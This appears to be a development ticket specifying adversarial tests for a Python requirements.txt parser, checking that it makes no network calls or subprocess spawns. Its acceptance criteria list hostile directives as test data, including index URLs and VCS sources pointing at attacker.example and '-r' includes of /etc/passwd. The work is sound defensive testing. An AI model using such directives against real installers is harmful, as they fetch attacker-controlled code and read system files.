# Story S5-05 — Adversarial `requirements.txt` corpus + zero-egress assertion

**Step:** Step 5 — Build the Python dep-graph strategies (pip / poetry / uv)
**Status:** Ready
**Effort:** M
**Depends on:** S5-02
**ADRs honored:** ADR-0009, ADR-0008

## Context
ADR-0009's directives are attacker-controlled — `--index-url http://attacker/` is a fetch instruction, `-r ../../../etc/passwd` is a path escape, `git+https://attacker/...` is a VCS fetch. This story is the adversarial proof: a hostile-directive corpus run through the pip strategy with network and subprocess monitors asserting *zero* outbound connections and *zero* spawns, plus a per-directive check that each hostile line maps to the correct typed fact. It also pins the `ALLOWED_BINARIES` closed-set regression (G8).

## References — where to look
- **Architecture:** `../phase-arch-design.md §Adversarial tests` — "the `requirements.txt` directive corpus → parser completes, a network monitor asserts zero outbound connections, a subprocess monitor asserts zero spawns, out-of-tree `-r` rejected, unknown directive → `unresolved`".
- **Architecture:** `../phase-arch-design.md §Fixture portfolio` — the exact hostile-directive set: `-e .`, `git+https://...`, `--index-url http://attacker/`, `--extra-index-url`, `-r /etc/passwd`, `-r ../../../etc/passwd`, an *unknown* directive.
- **Architecture:** `../phase-arch-design.md §Edge cases` rows 6, 7, 8 — `--index-url` (host only), out-of-tree `-r`, unknown directive (fail-closed).
- **Architecture:** `../phase-arch-design.md §CI gates` — "`ALLOWED_BINARIES` closed-set regression — `pip`/`poetry`/`uv`/`scip-python` not present" (G8).
- **Phase ADRs:** `../ADRs/0009-requirements-txt-directive-language-parsing-contract.md` — ADR-0009 — "an adversarial-network monitor asserts zero outbound connections and a subprocess monitor asserts zero spawns".
- **Phase ADRs:** `../ADRs/0008-python-depgraph-pure-parsing-no-resolution.md` — ADR-0008 — `ALLOWED_BINARIES` untouched.
- **Existing code:** `src/codegenie/depgraph/python/pip.py` (S5-02), `src/codegenie/depgraph/python/requirements.py` (S5-01) — the targets under test.
- **Existing code:** `src/codegenie/exec/` — `ALLOWED_BINARIES` frozenset; the closed-set assertion reads it.

## Goal
Add a hostile `requirements.txt` corpus and assert — via network and subprocess monitors — that the pip strategy makes zero outbound connections and zero spawns while classifying every hostile directive to its correct typed fact.

## Acceptance criteria
- [ ] The TDD red test exists, is committed, and fails before the assertion harness is wired — then green.
- [ ] A hostile-directive corpus fixture exists containing at least: `-e .`, `git+https://attacker.example/repo`, `--index-url http://attacker.example/simple/`, `--extra-index-url http://attacker.example/extra/`, `-r /etc/passwd`, `-r ../../../etc/passwd`, and an unknown directive.
- [ ] Running the pip strategy over the corpus with `socket.socket.connect` (and any HTTP client surface) patched to raise → the strategy completes with **zero outbound connections** observed.
- [ ] Running the pip strategy with `subprocess.Popen`/`os.posix_spawn` patched to raise → the strategy completes with **zero subprocess spawns** observed.
- [ ] Each hostile directive maps to the correct typed fact: `-e .` → `editable_install`, `git+...` → `vcs_source`, `--index-url`/`--extra-index-url` → `IndexOverride` (host only — the full attacker URL is absent from every field), `-r /etc/passwd` and `-r ../../../etc/passwd` → `out_of_tree_include` (neither file read), unknown → `unknown_directive`.
- [ ] An `ALLOWED_BINARIES` closed-set regression test asserts `pip`/`poetry`/`uv`/`scip-python` are NOT in the set (G8).
- [ ] `ruff check`, `ruff format --check`, `mypy --strict` pass on touched files; `pytest` green on touched test files; Status set to `Done`.

## Implementation outline
1. Create the corpus fixture under `tests/golden/languages/python/adversarial/` (or `tests/unit/depgraph/python/_fixtures/`) — a `requirements.txt` with every hostile directive listed above.
2. Create `tests/unit/depgraph/python/test_adversarial_requirements.py`.
3. Write a network monitor: patch `socket.socket.connect` (and `http.client.HTTPConnection.connect` / `urllib` surfaces) to raise `AssertionError` if called; run the pip strategy over the corpus inside it; assert no call fired and the strategy completed.
4. Write a subprocess monitor: patch `subprocess.Popen.__init__` / `os.posix_spawn` / `os.system` to raise; run the strategy; assert no spawn.
5. Add a parameterized per-directive test asserting the hostile line → the expected typed fact, including the `IndexOverride` host-only check (assert the attacker path/query never appear in any field).
6. Add the `ALLOWED_BINARIES` closed-set regression test reading `codegenie.exec`'s `ALLOWED_BINARIES` and asserting `{"pip", "poetry", "uv", "scip-python"}` is disjoint from it.

## TDD plan — red / green / refactor
### Red — write the failing test first
Test file: `tests/unit/depgraph/python/test_adversarial_requirements.py`.
Test name: `test_pip_strategy_makes_zero_outbound_connections_on_hostile_corpus`.
```python
def test_pip_strategy_makes_zero_outbound_connections_on_hostile_corpus(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # arrange: write the hostile-directive corpus; arm a network tripwire.
    _write_hostile_requirements(tmp_path)
    calls: list[object] = []
    def _tripwire(*a: object, **k: object) -> None:
        calls.append(a)
        raise AssertionError("pip strategy attempted an outbound connection")
    monkeypatch.setattr("socket.socket.connect", _tripwire)
    # act: the pure-parse strategy must complete without ever connecting.
    graph = default_dep_graph_registry.dispatch("pip", _ctx_for(tmp_path), _manifests(tmp_path))
    # assert: zero connections — the directive facts were recorded, never acted on.
    assert calls == []
    assert isinstance(graph, networkx.DiGraph)
```
Also red before the harness is wired: `test_pip_strategy_spawns_no_subprocess_on_hostile_corpus`, `test_each_hostile_directive_maps_to_correct_fact` (parameterized), `test_index_override_never_stores_attacker_path`, `test_allowed_binaries_excludes_python_package_managers`. The monitor-based tests fail until the tripwires are wired and confirmed not to fire.

### Green — make it pass
Wire the network/subprocess tripwires; build the corpus fixture; the pip strategy from S5-02 should already pass them if it is pure — if a monitor fires, the bug is in `pip.py`/`requirements.py`, fix there. Add the per-directive parameterized assertions and the `ALLOWED_BINARIES` check.

### Refactor — clean up
Extract the tripwire-arming into a reusable fixture/context manager; document each hostile line in the corpus with a comment naming the threat; ensure the per-directive cases cover every `reason` Literal member.

## Files to touch
| Path | Why |
|---|---|
| `tests/golden/languages/python/adversarial/requirements.txt` (or `tests/unit/depgraph/python/_fixtures/`) | The hostile-directive corpus fixture. |
| `tests/unit/depgraph/python/test_adversarial_requirements.py` | The zero-egress / zero-spawn monitors + per-directive fact assertions + `ALLOWED_BINARIES` regression. |

## Out of scope
- The depgraph-purity AST fence — S5-06 (the *static* proof; this story is the *dynamic* proof).
- The poetry/uv oversized-lockfile adversarial cases — unit-tested in S5-03/S5-04; the broader adversarial fixture portfolio is S7-04.
- The bidi/zero-width package-name sanitizer cases — S7-04 (the sanitizer needs no Python-specific change).

## Notes for the implementer
- This is the *dynamic* proof; S5-06 is the *static* proof. They are complementary — a lazy-imported `requests` inside a function body would slip past S5-06's AST walk but be caught here if it ever connected. Do not collapse them.
- The network tripwire must cover the real connection surface — `socket.socket.connect` is the floor; also patch `http.client` and any `urllib` request path so the test cannot be fooled by a higher-level client.
- The `IndexOverride` host-only assertion has teeth only if you assert the attacker path/query/scheme are *absent from every field* — not just that `url_host` is set (Rule 9; ADR-0009 data minimization).
- `-r /etc/passwd` (absolute, outside repo) and `-r ../../../etc/passwd` (relative escape) are *both* `out_of_tree_include` — and the test must assert neither file was read (the path-escape is recorded, never followed).
- The unknown-directive case is the fail-closed teeth — assert it becomes `unknown_directive`, never silently dropped (ADR-0009).
- The `ALLOWED_BINARIES` closed-set test (G8) is small but load-bearing — it is the standing guard that no future story sneaks `pip`/`poetry`/`uv` into the jail allowlist.
